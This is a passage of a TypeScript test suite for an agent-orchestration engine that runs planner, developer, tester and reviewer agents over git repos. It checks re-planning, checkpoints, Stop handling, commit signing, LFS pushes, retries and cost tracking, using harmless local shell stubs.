  const { path: PATH } = remoteSetup(ws, '#!/bin/sh\nexit 0\n', { repos: ['api', 'web'], edit: 'echo "HTTP 502: Bad Gateway" >&2; exit 1' });
  const h = await harness(ws, { FAKE_REPOS: 'api,web', PATH });
  const warnings: string[] = [];
  h.engine.on('log', (l: { level: string; message: string }) => l.level === 'warn' && warnings.push(l.message));
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    await h.engine.answer(taskId, 'confirm-push', 'push');
    const s = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)));
    assert.equal(s.outcome, 'published', JSON.stringify(h.engine.lastError(taskId)));
    assert.deepEqual(Object.keys(s.prs).sort(), ['api', 'web']);
    assert.ok(warnings.some((w) => /pull\/7 was opened, but its description could not list the other PRs: HTTP 502/.test(w)), warnings.join('\n'));
  } finally {
    h.hooks.dispose();
  }
});

test('engine: an answer from a page that showed an earlier question does not answer the new one', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Plan the feature' });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'approve-plan');
    // The page still showed the plan before a re-plan: its question was asked at another time.
    await assert.rejects(() => h.engine.answer(taskId, 'approve-plan', 'approve', { at: '2020-01-01T00:00:00.000Z' }), /question changed since this page showed it/);
    assert.equal((await h.engine.svc.state(taskId)).checkpoint!.id, 'approve-plan', 'still asked');
    await h.engine.answer(taskId, 'approve-plan', 'approve', { at: s.checkpoint!.at });
    const after = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)));
    assert.equal(after.checkpoint && after.checkpoint.id, 'confirm-push', 'the plan it was asked about was approved');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a step remembers the account it ran under, where its session can be continued', async () => {
  const ws = workspace(['api'], 'pipeline: [planner]\nrepos:\n  api: {}\n');
  const account = path.join(ws, 'account-b');
  const h = await harness(ws, { FAKE_REPOS: 'api', CLAUDE_CONFIG_DIR: account });
  try {
    const { taskId } = await h.engine.start({ text: 'Plan the feature', auto: true });
    await runTask(h.engine, taskId);
    const planner = (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'planner')!;
    assert.equal(planner.configDir, account, 'claude --resume looks there, whatever account is chosen later');
  } finally {
    h.hooks.dispose();
  }
});

test("engine: a plan whose branch is there already goes back to the planner: the task never builds on another's commits", async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const api = path.join(ws, 'api');
  // What an earlier task with the same slug left: a branch with its own commit.
  git(api, 'switch', '-q', '-c', 'feat/add-feature');
  fs.writeFileSync(path.join(api, 'theirs.txt'), 'another task\n');
  git(api, 'add', '.');
  git(api, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'another task');
  git(api, 'switch', '-q', 'main');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(s.plan!.slug, 'add-feature-again');
    assert.equal(git(api, 'rev-parse', '--abbrev-ref', 'HEAD'), 'feat/add-feature-again');
    assert.equal(fs.existsSync(path.join(api, 'theirs.txt')), false, "the other task's commit is not on this branch");
    const planner = await h.engine.svc.readTranscript(taskId, (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'planner')!.key!);
    assert.ok(planner.some((i) => i.type === 'user' && i.from === 'orchestrator' && /branch feat\/add-feature is there already in api/.test(text(i.text))));
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a plan for a repo the workspace does not have goes back to the planner, who sees the repos by name', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: { role: Betting API }\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', FAKE_PLAN_REPOS_FIRST: 'betting-service' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    assert.deepEqual(s.repos.map((r) => r.name), ['api']);
    const planner = await h.engine.svc.readTranscript(taskId, (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'planner')!.key!);
    const prompt = text(planner.find((i) => i.type === 'prompt')!.text);
    assert.match(prompt, /- api at .+ \(base branch main\): Betting API\nName the repos of your plan exactly as listed here\./);
    assert.ok(planner.some((i) => i.type === 'user' && i.from === 'orchestrator' && /repos this workspace does not have \(betting-service\); name them as configured: api/.test(text(i.text))));
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a plan handed over as data alone goes back to the planner for its text, and never reaches you without it', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', FAKE_PLAN_NO_TEXT: '1' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature' });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'approve-plan', JSON.stringify(h.engine.lastError(taskId)));
    const planner = await h.engine.svc.readTranscript(taskId, (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'planner')!.key!);
    assert.ok(planner.some((i) => i.type === 'user' && i.from === 'orchestrator' && /the report has no text, only its data/.test(text(i.text))));
    const artifact = fs.readFileSync(path.join(h.engine.svc.dir(taskId), s.artifacts.find((a) => a.output === 'plan')!.path), 'utf8');
    assert.match(artifact, /^## Summary[\s\S]*### api\n/, 'the plan you approve is the text the planner wrote');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a plan names the branch a repo starts from: the task branches from it and its PR goes into it; one origin lacks goes back', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const api = path.join(ws, 'api');
  // origin has promo, 2 commits past main, and the code the ticket is about is only there.
  const origin = path.join(ws, 'origin.git');
  git(ws, 'init', '-q', '--bare', origin);
  git(api, 'remote', 'add', 'origin', origin);
  git(api, 'push', '-q', 'origin', 'main');
  git(api, 'switch', '-q', '-c', 'promo');
  fs.writeFileSync(path.join(api, 'promo.ts'), 'export const rows = 8;\n');
  git(api, 'add', '.');
  git(api, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '-m', 'promo');
  git(api, 'push', '-q', 'origin', 'promo');
  git(api, 'switch', '-q', 'main');
  git(api, 'branch', '-q', '-D', 'promo');
  const h = await harness(ws, { FAKE_REPOS: 'api', FAKE_PLAN_BASE_FIRST: 'promo-v2', FAKE_PLAN_BASE: 'promo' });
  try {
    const { taskId } = await h.engine.start({ text: 'Read the Promo config from the server', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    const planner = await h.engine.svc.readTranscript(taskId, (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'planner')!.key!);
    assert.ok(planner.some((i) => i.type === 'user' && i.from === 'orchestrator' && /origin has no branch promo-v2 \(in api\)/.test(text(i.text))));
    assert.equal(s.repos[0]!.baseBranch, 'promo');
    const branch = git(api, 'branch', '--show-current').trim();
    assert.ok(fs.existsSync(path.join(api, 'promo.ts')), 'the task branch has the code that is only on promo');
    assert.equal(git(api, 'rev-list', '--count', `origin/promo..${branch}`).trim(), '1', 'and only the task commit past it');
    const ctx = await h.engine.checkpointContext(s, s.checkpoint!);
    assert.deepEqual(ctx.repos!.map((r) => [r.name, r.base, r.files]), [['api', 'promo', 1]], 'the push goes into promo, with the task change alone');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a plan that names a repo twice goes back to the planner, and its repo runs once', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', FAKE_PLAN_REPOS_FIRST: 'api,api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    const started = only(await h.engine.svc.events(taskId), 'stage_started').map((e) => `${e.agent}${e.repo ? `@${e.repo}` : ''}`);
    assert.deepEqual(started, ['planner', 'developer@api']);
    const planner = await h.engine.svc.readTranscript(taskId, (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'planner')!.key!);
    assert.ok(planner.some((i) => i.type === 'user' && i.from === 'orchestrator' && /api is named more than once/.test(text(i.text))));
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a scenario without a planner works in the repos the task names, on a branch named after the ticket', async () => {
  const ws = workspace(['api', 'web'], 'repos:\n  api: {}\n  web: {}\nscenarios:\n  hotfix:\n    label: Hotfix\n    agents: [developer, reviewer]\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    assert.match((await previewOf(h.engine, { text: 'Fix the typo --repos billing', scenario: 'hotfix' })).problem!, /--repos names repos this workspace does not have: billing \(configured: api, web\)/);
    assert.match((await previewOf(h.engine, { text: 'Add a thing --repos api' })).problem!, /the planner names the repos/, 'deliver has a planner');
    assert.equal((await previewOf(h.engine, { text: 'Fix the typo --repos api', scenario: 'hotfix' })).problem, undefined);

    const { taskId } = await h.engine.start({ text: 'Fix the typo in the README --repos api --auto', scenario: 'hotfix' });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    assert.deepEqual(s.repos.map((r) => r.name), ['api'], 'only the repo it names');
    assert.equal(git(path.join(ws, 'api'), 'rev-parse', '--abbrev-ref', 'HEAD'), 'fix/fix-the-typo-in-the-readme');
    assert.equal(git(path.join(ws, 'api'), 'log', '-1', '--format=%s'), 'fix: Fix the typo in the README');
    assert.equal(git(path.join(ws, 'web'), 'rev-parse', '--abbrev-ref', 'HEAD'), 'main', 'web was not touched');

    // The same words again: that branch has the first task's commit, so the second gets its own.
    git(path.join(ws, 'api'), 'switch', '-q', 'main');
    const again = await h.engine.start({ text: 'Fix the typo in the README --repos api --auto', scenario: 'hotfix', key: 'T-AGAIN' });
    const s2 = await runTask(h.engine, again.taskId);
    assert.equal(s2.checkpoint && s2.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(again.taskId)));
    assert.equal(git(path.join(ws, 'api'), 'rev-parse', '--abbrev-ref', 'HEAD'), 'fix/fix-the-typo-in-the-readme-2');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a task another VS Code window runs is shown as running there, and is not run here as well', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    fs.writeFileSync(path.join(h.engine.svc.dir(taskId), 'run.lease'), `${process.ppid}\n`);
    await assert.rejects(() => h.engine.run(taskId), (e: { code?: string }) => e.code === 'running_elsewhere');
    assert.equal(h.engine.isRunning(taskId), false);
    const card = await view.summary(h.engine, { taskId, state: await h.engine.svc.state(taskId) });
    assert.deepEqual([card.status.key, card.status.resumable], ['elsewhere', false]);
    assert.equal(only(await h.engine.svc.events(taskId), 'stage_started').length, 0, 'no agent started here');

    fs.rmSync(path.join(h.engine.svc.dir(taskId), 'run.lease'));
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    assert.ok(!fs.existsSync(path.join(h.engine.svc.dir(taskId), 'run.lease')), 'released when the run ends');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: Stop ends a commit hook that runs, and no repo after it is committed', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api', 'web'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n  web: {}\n');
  const marker = path.join(ws, 'hook-started');
  fs.writeFileSync(path.join(ws, 'api', '.git', 'hooks', 'pre-commit'), `#!/bin/sh\ntouch '${marker}'\nsleep 30\n`, { mode: 0o755 });
  const h = await harness(ws, { FAKE_REPOS: 'api,web' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const run = runTask(h.engine, taskId);
    await waitFor(async () => fs.existsSync(marker), 60000);
    const started = Date.now();
    await h.engine.stop(taskId);
    const s = await run;
    assert.ok(Date.now() - started < 10000, `the hook was ended, not waited for (${Date.now() - started} ms)`);
    assert.equal(s.status, 'stopped');
    assert.equal(git(path.join(ws, 'web'), 'log', '-1', '--format=%s'), 'init', 'web was not committed after it');
    assert.equal(only(await h.engine.svc.events(taskId), 'commit_failed').length, 0, 'a stopped hook is not a failed commit');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: deleting a running task stops it, waits for its run to end, and leaves nothing behind', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', FAKE_DELAY: '400' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    h.engine.launch(taskId);
    await waitFor(async () => only(await h.engine.svc.events(taskId), 'stage_started').length > 0, 10000);
    await h.engine.remove(taskId);
    assert.equal(h.engine.isRunning(taskId), false, 'its run has ended');
    await new Promise((r) => setTimeout(r, 300));
    assert.ok(!fs.existsSync(h.engine.svc.dir(taskId)), 'the folder stays gone');
    assert.deepEqual((await h.engine.svc.list()).map((e) => e.taskId), []);
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a message to the agent is taken while it works, not while its checks run', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api:\n    gates:\n      - { name: slow, cmd: sleep 3 }\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const run = runTask(h.engine, taskId);
    await waitFor(async () => {
      const live = h.engine.live(taskId);
      return live && live.phase === 'gates';
    }, 60000);
    assert.throws(() => h.engine.sendMessage(taskId, 'also rename X'), /not working right now/);
    assert.equal((await view.detail(h.engine, taskId)).canMessage, false, 'the box says so too');
    const s = await run;
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a commit is signed with your key where commit.gpgsign asks for it, outside the sandbox its hooks run in', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const api = path.join(ws, 'api');
  const keys = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-sign-'));
  execFileSync('ssh-keygen', ['-q', '-t', 'ed25519', '-N', '', '-f', path.join(keys, 'id'), '-C', 'cs-test']);
  git(api, 'config', 'gpg.format', 'ssh');
  git(api, 'config', 'user.signingkey', path.join(keys, 'id'));
  git(api, 'config', 'commit.gpgsign', 'true');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    assert.match(execFileSync('git', ['cat-file', 'commit', 'HEAD'], { cwd: api, encoding: 'utf8' }), /^gpgsig -----BEGIN SSH SIGNATURE-----/m);
    assert.equal(git(api, 'log', '-1', '--format=%s'), 'feat: add the feature');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: Git LFS files are uploaded with your credentials before the push, and the sandboxed hook skips its upload', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  fs.writeFileSync(path.join(ws, 'api', '.gitattributes'), '*.bin filter=lfs diff=lfs merge=lfs -text\n');
  git(path.join(ws, 'api'), 'add', '.');
  git(path.join(ws, 'api'), 'commit', '-q', '-m', 'lfs');
  const { remote, path: PATH } = remoteSetup(ws, '#!/bin/sh\necho "skip=${GIT_LFS_SKIP_PUSH:-no}" >> "$FAKE_STATE/pre-push.log"\n');
  // git runs `git lfs` from PATH: a stand-in that records what it was asked.
  const bin = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-lfs-'));
  fs.writeFileSync(path.join(bin, 'git-lfs'), '#!/bin/sh\necho "$@" >> "$FAKE_STATE/lfs.log"\n', { mode: 0o755 });
  const h = await harness(ws, { FAKE_REPOS: 'api', PATH: `${bin}${path.delimiter}${PATH}` });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    await h.engine.answer(taskId, 'confirm-push', 'push');
    const s = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)), 60000);
    assert.equal(s.outcome, 'published', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(fs.readFileSync(path.join(h.state, 'pre-push.log'), 'utf8').trim(), 'skip=1');
    assert.equal(fs.readFileSync(path.join(h.state, 'lfs.log'), 'utf8').trim(), 'push origin feat/add-feature');
    assert.equal(git(remote, 'rev-parse', 'feat/add-feature'), git(path.join(ws, 'api'), 'rev-parse', 'feat/add-feature'));
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a retried step is told why its attempt before failed', async () => {
  const ws = workspace(['api'], `pipeline: [planner, developer]\nlimits: { gateAttempts: 1 }\nrepos:\n  api:\n    gates:\n      - { name: lint, cmd: 'echo "lint: 1 error in src/a.ts"; exit 1' }\n`);
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    let s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'gate-failure');
    await h.engine.answer(taskId, 'gate-failure', 'retry');
    s = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)), 60000);
    const steps = (await view.detail(h.engine, taskId)).steps.filter((st) => st.agent === 'developer' && st.key);
    const prompt = text((await h.engine.svc.readTranscript(taskId, steps[steps.length - 1]!.key!)).find((i) => i.type === 'prompt')!.text);
    assert.match(prompt, /Mode: retry: the previous attempt failed; why is below/);
    assert.match(prompt, /Why the previous attempt failed[^\n]*:\nChecks were still red after 1 attempt:\n[\s\S]*lint: 1 error in src\/a\.ts/);
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a developer that cannot go on stops the step for you, and a blocked tester is not sent back to its red checks', async () => {
  const ws = workspace(['api'], `pipeline: [planner, developer, tester, reviewer]\nrepos:\n  api:\n    gates:\n      - { name: test, cmd: 'test ! -f feature.test.txt || { echo "1 failing: discount over 100%"; exit 1; }' }\n`);
  let h = await harness(ws, { FAKE_REPOS: 'api', FAKE_BLOCKED: 'developer' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'agent-failure');
    assert.match(s.checkpoint!.reason!, /developer @ api reports it cannot go on: the plan names table bets_v2/);
    assert.equal(s.checkpoint!.blocked, true, 'blocked, not stopped early');
    assert.equal((await view.summary(h.engine, { taskId, state: s })).status.label, 'An agent is blocked');
    const started = only(await h.engine.svc.events(taskId), 'stage_started').map((e) => e.agent);
    assert.deepEqual(started, ['planner', 'developer'], 'no checks, tester or review on work it did not do');
    assert.equal(only(await h.engine.svc.events(taskId), 'gates_ran').length, 0);
  } finally {
    h.hooks.dispose();
  }

  const ws2 = workspace(['api'], `pipeline: [planner, developer, tester, reviewer]\nlimits: { gateAttempts: 3 }\nrepos:\n  api:\n    gates:\n      - { name: test, cmd: 'test ! -f feature.test.txt || { echo "1 failing: discount over 100%"; exit 1; }' }\n`);
  h = await harness(ws2, { FAKE_REPOS: 'api', FAKE_BLOCKED: 'tester' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    let s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'gate-failure');
    const testerGates = only(await h.engine.svc.events(taskId), 'gates_ran').filter((e) => e.agent === 'tester');
    assert.deepEqual(testerGates.map((e) => e.attempt), [1], 'red once, not sent back to fix code it may not change');
    // You go on: the reviewer is told the check is red, with its output.
    await h.engine.answer(taskId, 'gate-failure', 'continue');
    s = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)), 60000);
    const reviewer = (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'reviewer' && st.key);
    const prompt = text((await h.engine.svc.readTranscript(taskId, reviewer!.key!)).find((i) => i.type === 'prompt')!.text);
    assert.match(prompt, /Checks that are still red: the user chose to go on past them[\s\S]*1 failing: discount over 100%/);
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a turn that failed on an overloaded API goes on in the same session after a pause, before you are asked', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api', FAKE_API_ERROR_ONCE: 'developer' });
  h.engine.retryDelayMs = 50;
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    const developer = (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'developer' && st.key)!;
    const items = await h.engine.svc.readTranscript(taskId, developer.key!);
    assert.ok(items.some((i) => i.type === 'user' && i.from === 'orchestrator' && /Continue where you left off/.test(text(i.text))), 'told to go on, in the same session');
    assert.equal(only(await h.engine.svc.events(taskId), 'stage_started').filter((e) => e.agent === 'developer').length, 1, 'one step, not a new one');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: an API error while fixing red checks goes on in the same session, and a developer that says it is blocked there stops the step though its checks pass', async () => {
  // Red on the first run only: the developer's fix turn is what decides.
  const gates = `repos:\n  api:\n    gates:\n      - { name: lint, cmd: 'test -f .linted || { touch .linted; echo "lint: 1 error"; exit 1; }' }\n`;
  let ws = workspace(['api'], `pipeline: [planner, developer]\n${gates}`);
  let h = await harness(ws, { FAKE_REPOS: 'api', FAKE_API_ERROR_GATES: 'developer' });
  h.engine.retryDelayMs = 50;
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    const developer = (await view.detail(h.engine, taskId)).steps.find((st) => st.agent === 'developer' && st.key)!;
    const items = await h.engine.svc.readTranscript(taskId, developer.key!);
    assert.ok(items.some((i) => i.type === 'user' && i.from === 'orchestrator' && /Continue where you left off/.test(text(i.text))), 'the fix turn went on after the pause');
    assert.equal(only(await h.engine.svc.events(taskId), 'stage_started').filter((e) => e.agent === 'developer').length, 1);
  } finally {
    h.hooks.dispose();
  }

  ws = workspace(['api'], `pipeline: [planner, developer, reviewer]\n${gates}`);
  h = await harness(ws, { FAKE_REPOS: 'api', FAKE_BLOCKED_ON_GATES: 'developer' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'agent-failure');
    assert.match(s.checkpoint!.reason!, /developer @ api reports it cannot go on: the check needs a database/);
    assert.deepEqual(only(await h.engine.svc.events(taskId), 'stage_started').map((e) => e.agent), ['planner', 'developer'], 'no review of work it said it could not do');
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a check the agent cannot fix (its folder is not there) goes to you at once, not back to the agent', async () => {
  const ws = workspace(['api'], `pipeline: [planner, developer]\nlimits: { gateAttempts: 3 }\nrepos:\n  api:\n    gates:\n      - { name: e2e, cmd: 'true', dir: e2e }\n`);
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    const s = await runTask(h.engine, taskId);
    assert.equal(s.checkpoint && s.checkpoint.id, 'gate-failure');
    const runs = only(await h.engine.svc.events(taskId), 'gates_ran');
    assert.deepEqual(runs.map((e) => e.attempt), [1], 'no paid turn on what the agent cannot change');
    assert.match(runs[0]!.summary, /FAIL api e2e: its dir e2e does not exist \(fix the check in the config\)/);
  } finally {
    h.hooks.dispose();
  }
});

test('engine: every session records its id and cost as it goes, so a run that never ended still counts against the budget', async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    const events = await h.engine.svc.events(taskId);
    const progress = only(events, 'agent_progress');
    assert.ok(progress.some((e) => e.agent === 'developer' && e.payload.sessionId && e.payload.costUsd === 0), 'the session id, as soon as it starts');
    assert.ok(progress.some((e) => e.agent === 'developer' && Number(e.payload.costUsd) > 0), 'its cost after a turn');
    const stopped = only(events, 'agent_stopped');
    const total = stopped.reduce((n, e) => n + Number(e.payload!.costUsd), 0);
    assert.equal((await h.engine.spentUsd(taskId)).toFixed(4), total.toFixed(4), 'each session counts once');
    // VS Code closed before a session ended: its last progress still counts.
    const lost = { ...progress.filter((e) => e.agent === 'developer').pop()!, payload: { ...progress.filter((e) => e.agent === 'developer').pop()!.payload, sessionId: 'lost-session', costUsd: 0.5 } };
    await h.engine.svc.record(taskId, { type: 'agent_progress', agent: lost.agent, payload: lost.payload });
    assert.equal((await h.engine.spentUsd(taskId)).toFixed(4), (total + 0.5).toFixed(4));
    assert.equal((await view.detail(h.engine, taskId)).cost.toFixed(4), (total + 0.5).toFixed(4));
  } finally {
    h.hooks.dispose();
  }
});

test('engine: a planner after the agents worked in the repos keeps the branch their work is on', async () => {
  const ws = workspace(['api'], 'pipeline: [developer, planner, tester]\nrepos:\n  api: {}\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature --repos api' });
    let s = await runTask(h.engine, taskId);
    const branch = git(path.join(ws, 'api'), 'branch', '--show-current');
    assert.equal(s.checkpoint && s.checkpoint.id, 'approve-plan', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(git(path.join(ws, 'api'), 'branch', '--show-current'), branch);
    await h.engine.answer(taskId, 'approve-plan', 'approve');
    s = await waitFor(async () => (h.engine.isRunning(taskId) ? null : await h.engine.svc.state(taskId)), 60000);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(h.engine.lastError(taskId)));
    assert.equal(git(path.join(ws, 'api'), 'branch', '--show-current'), branch, 'the work stayed on its branch');
    assert.match(git(path.join(ws, 'api'), 'log', '-1', '--name-only', '--format='), /feature\.txt/);
  } finally {
    h.hooks.dispose();
  }
});

test('engine: Stop during a push ends it, and no PR is opened after it; every PR opened is recorded at once', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api', 'web'], 'pipeline: [planner, developer]\npolicy: { draftPrsOnly: false }\nrepos:\n  api: {}\n  web: {}\n');
  const { remote, path: PATH } = remoteSetup(ws, '#!/bin/sh\nexit 0\n', { repos: ['api', 'web'] });
  // The remote takes its time with web's push.
  fs.writeFileSync(path.join(ws, 'web-remote.git', 'hooks', 'pre-receive'), '#!/bin/sh\ntouch "$FAKE_STATE/receiving"\nsleep 20\n', { mode: 0o755 });
  const bin = PATH.split(path.delimiter)[0]!;
  fs.writeFileSync(path.join(bin, 'gh'), `#!/bin/sh\necho "$@" >> "$FAKE_STATE/gh.log"\ncase "$1 $2" in "pr view") exit 1;; "pr create") echo "https://github.com/acme/$(basename "$PWD")/pull/7";; *) exit 0;; esac\n`, { mode: 0o755 });
  const h = await harness(ws, { FAKE_REPOS: 'api,web', PATH });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    await h.engine.answer(taskId, 'confirm-push', 'push');
    await waitFor(() => fs.existsSync(path.join(h.state, 'receiving')), 60000);
    const started = Date.now();
    await h.engine.stop(taskId);
    await waitFor(() => !h.engine.isRunning(taskId), 15000);
    assert.ok(Date.now() - started < 10000, 'the push was ended, not waited for');
    const gh = fs.readFileSync(path.join(h.state, 'gh.log'), 'utf8');
    assert.equal((gh.match(/^pr create/gm) || []).length, 1, 'api only, opened before the Stop');
    assert.doesNotMatch(gh, /--draft/, 'policy.draftPrsOnly: false opens PRs ready for review');
    const opened = only(await h.engine.svc.events(taskId), 'pr_opened');
    assert.deepEqual(opened.map((e) => [e.repo, e.url]), [['api', 'https://github.com/acme/api/pull/7']]);
    assert.ok(remote);
  } finally {
    h.hooks.dispose();
  }
});

test("engine: a task's commit left unsigned while the repo is on another branch is not pushed unsigned: you are asked to switch back", { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'pipeline: [planner, developer]\nrepos:\n  api: {}\n');
  const api = path.join(ws, 'api');
  const keys = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-sign-'));
  execFileSync('ssh-keygen', ['-q', '-t', 'ed25519', '-N', '', '-f', path.join(keys, 'id'), '-C', 'cs-test']);
  git(api, 'config', 'gpg.format', 'ssh');
  git(api, 'config', 'user.signingkey', path.join(keys, 'id'));
  git(api, 'config', 'commit.gpgsign', 'true');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Add the feature', auto: true });
    await runTask(h.engine, taskId);
    // A Stop between the sandboxed commit and its signing, then you switch the checkout.
